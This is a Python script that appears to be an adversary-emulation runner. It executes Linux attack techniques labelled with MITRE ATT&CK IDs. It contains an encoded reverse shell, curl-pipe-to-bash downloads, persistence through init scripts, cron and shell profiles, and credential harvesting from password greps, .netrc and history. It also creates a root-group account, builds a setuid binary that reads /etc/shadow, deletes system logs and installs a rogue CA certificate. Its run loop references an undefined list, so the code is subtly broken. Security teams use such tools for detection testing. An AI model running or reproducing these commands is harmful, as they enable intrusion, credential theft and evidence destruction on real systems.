import os, datetime
import logging
import sys


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


cwd = os.getcwd()
evil_cmd = '''python -c \\"import os, base64;exec(base64.b64decode('aW1wb3J0IHNvY2tldCAsICAgc3VicHJvY2VzcyAsICAgb3MgIDsgICAgaG9zdD0iMTI3LjAuMC4xIiAgOyAgICBwb3J0PTQ0NCAgOyAgICBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQgLCAgIHNvY2tldC5TT0NLX1NUUkVBTSkgIDsgICAgcy5jb25uZWN0KChob3N0ICwgICBwb3J0KSkgIDsgICAgb3MuZHVwMihzLmZpbGVubygpICwgICAwKSAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCkgLCAgIDEpICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSAsICAgMikgIDsgICAgcD1zdWJwcm9jZXNzLmNhbGwoIi9iaW4vYmFzaCIp'))\\"'''


T1543_002 = '''
cat > /etc/init.d/T1543.002 << EOF
#!/bin/bash
### BEGIN INIT INFO
# Provides : Atomic Test T1543.002
# Required-Start: $all
# Required-Stop : 
# Default-Start: 2 3 4 5
# Default-Stop: 
# Short Description: Atomic Test for Systemd Service Creation
### END INIT INFO

python3 -c "import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK'))"

EOF

chmod +x /etc/init.d/T1543.002
if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID="centos"') ]; then chkconfig T1543.002 on ; else echo "Please run this test on Ubnutu , kali OR centos" ; fi ;
systemctl enable T1543.002
systemctl start T1543.002

echo "python3 -c \\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\\"" | sudo tee -a /etc/init.d/T1543.002
systemctl daemon-reload
systemctl restart T1543.002
'''

T1552_001 = '''
grep -ri password /
for file in $(find / -name .netrc 2> /dev/null);do echo $file ; cat $file ; done
'''

T1136 = '''
sudo useradd -M -N -r -s /bin/bash -c T1136_account T1136_user_1
sudo useradd -g 0 -M -d /root -s /bin/bash T1136_user_2
if [ $(cat /etc/os-release | grep -i 'Name="ubuntu"') ]; then echo "T1136_user_2:T1136_password_2" | sudo chpasswd; else echo "T1136_password_2" | passwd --stdin T1136_user_2; fi;
'''

T1037_004_rc_common = '''
filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi
printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.common
echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\"" | sudo tee -a /etc/rc.common
printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.common
sudo chmod +x /etc/rc.common
'''

T1037_004_rc_local = '''
filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi
printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.local
echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\"" | sudo tee -a /etc/rc.local
printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.common
sudo chmod +x /etc/rc.local

'''

T1546_005_url = 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1546.005/src/echo-art-fish.sh'
T1546_005 = '''
trap 'nohup curl -sS ''' + T1546_005_url + ''' | bash' EXIT
exit
trap 'nohup curl -sS ''' + T1546_005_url + ''' | bash' INT
'''


T1546_004 = '''
echo "''' + str(evil_cmd) + '''" >> ~/.bash_profile
'''


T1053_003 = '''
echo "''' + str(evil_cmd) + '''" > /tmp/T1053_003.sh 
chmod +x /tmp/T1053_003.sh
echo "* * * * * /tmp/T1053_003.sh" > /tmp/T1053_003_crontab
crontab /tmp/T1053_003_crontab
'''


T1070 = '''
sudo rm -rf /var/log/*
'''


T1548_001_linux_c_file = '''
#include <unistd.h> 

main() 
{         
    char *ls[3];         
    ls[0] = "/bin/cat";         
    ls[1] = "/etc/shadow";         
    ls[2] =  NULL;         
    execve(ls[0],ls,NULL); 
}
'''

makefile = '''
all: T1548_001.c
	gcc -static -g -o T1548_001 T1548_001.c
'''

T1548_001_c_file = open('T1548_001.c', 'w')
T1548_001_c_file.write(T1548_001_linux_c_file)
T1548_001_c_file.close()

T1548_001_makefile = open('makefile', 'w')
T1548_001_makefile.write(makefile)
T1548_001_makefile.close()

T1548_001 = '''
make T1548_001
sudo chown root T1548_001
sudo chmod u+s T1548_001
'''


T1070_006 = '''
touch -a -t 197001010000.00 /tmp/T1070-006-1
touch -m -t 197001010000.00 /tmp/T1070-006-2	

NOW=$(date)
date -s "1970-01-01 00:00:00"
touch /tmp/T1070-006-3
date -s "$NOW"
stat /tmp/T1070-006-3
'''

# TESTING DIFFERS BASED ON OS FLAVOR

T1553_004_ssl_dir = "/etc/ssl/certs/"

T1553_004 = '''
openssl req -subj '/CN=Temporary Cert/O=Temporary Cert/C=US' -new -newkey rsa:2048 -sha256 -days 365 -nodes -x509 -keyout T1130-key.pem -out T1130-cert.pem
sudo cp T1130-cert.pem ''' + T1553_004_ssl_dir + '''
sudo update-ca-certificates
'''


T1562_003 = '''
export HISTCONTROL=ignoreboth
set +o history
history -c
set -o history
'''


T1552_003 = '''
cat ~/.bash_history | grep 'pass\|ssh\|rdesktop' > /tmp/T1139.txt
'''


T1059_004_url = 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh'

T1059_004 = '''
bash -c "curl -sS ''' + T1059_004_url + ''' | bash"
bash -c "wget --quiet -O - ''' + T1059_004_url + ''' | bash"
'''

TTP_NUMBERS_LINUX = ["T1543_002","T1552_001","T1136","T1037_004_rc_common","T1037_004_rc_local","T1546_005","T1546_004","T1053_003","T1070","T1548_001","T1070_006","T1553_004","T1562_003","T1552_003","T1059_004"]


TTP_LIST_LINUX = [T1543_002,T1552_001,T1136,T1037_004_rc_common,T1037_004_rc_local,T1546_005,T1546_004,T1053_003,T1070,T1548_001,T1070_006,T1553_004,T1562_003,T1552_003,T1059_004]


for i in range(len(TTP_LIST_LINUX)):
    try:
        print(datetime.datetime.now())
        print("")
        print(bcolors.BOLD + bcolors.FAIL + "Executing " + bcolors.OKGREEN + TTP_NUMBERS_MAC[i] + bcolors.ENDC)
        print("")
        print(TTP_LIST_LINUX[i])
        print("")
        os.popen(TTP_LIST_LINUX[i]).read()  # UNCOMMENT THIS WHEN YOU PLAN TO EXECUTE THE TTPS
        print('-'*80)
        with open('log.txt', 'a') as log:
            log.write(str(datetime.datetime.now()))
            log.write("\n\n")
            log.write(bcolors.BOLD + bcolors.FAIL + "Executing " + bcolors.OKGREEN + TTP_NUMBERS_MAC[i] + bcolors.ENDC)
            log.write("\n")
            log.write(TTP_LIST_LINUX[i])
            log.write("\n")
            log.write("------------------------------------------------------------------------------------------------------------------------------------------------------\n\n")
        print("\n")
    except:
        print ("Could not execute : " + str(TTP_LIST_LINUX[i]))


print(bcolors.BOLD + bcolors.WARNING + "MANUALLY RUN ./T1548_001 AS NON ROOT USER\n\n" + bcolors.ENDC)

'''

T1543_002
T1552_001
T1136
T1037_004_rc_common
T1037_004_rc_local
T1546_005
T1546_004
T1053_003
T1070
T1548_001
T1070_006
T1553_004
T1562_003
T1552_003
T1059_004

'''

